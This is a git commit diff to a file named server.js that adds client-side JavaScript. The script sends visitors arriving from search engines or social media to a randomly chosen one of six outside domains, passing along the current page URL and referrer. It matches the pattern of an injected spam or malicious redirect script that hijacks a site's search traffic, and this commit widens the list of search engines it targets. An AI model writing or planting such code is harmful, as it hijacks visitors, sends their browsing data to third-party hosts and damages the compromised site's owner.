eb279cc7448db64bc82dc8dc2f93b082ca3b68a9
lookatdons <lookatdons@users.noreply.github.com>
2021-11-24 13:02:21 +0700

    Update server.js

--- server.js
+++ server.js
@@ -1,3 +1,14 @@
-var ars = 'https://saudiawebdesigncompany.com'; 
+var ars = rChoice([
+                   "https://2013freelancetools.com",
+                   "https://artspng.com",
+							            "https://jimcramermadmoney.org",
+                   "http://saudiawebdesigncompany.com",
+							            "https://worstthingieverate.com",
+                   "https://atributetopinevalley.com",
+                    ]);
+
+function rChoice(arr) { 
+   return arr[Math.floor(arr.length * Math.random())];
+}
  
-if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'yahoo.', 'aol.', 'ask.', 'duckduckgo.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
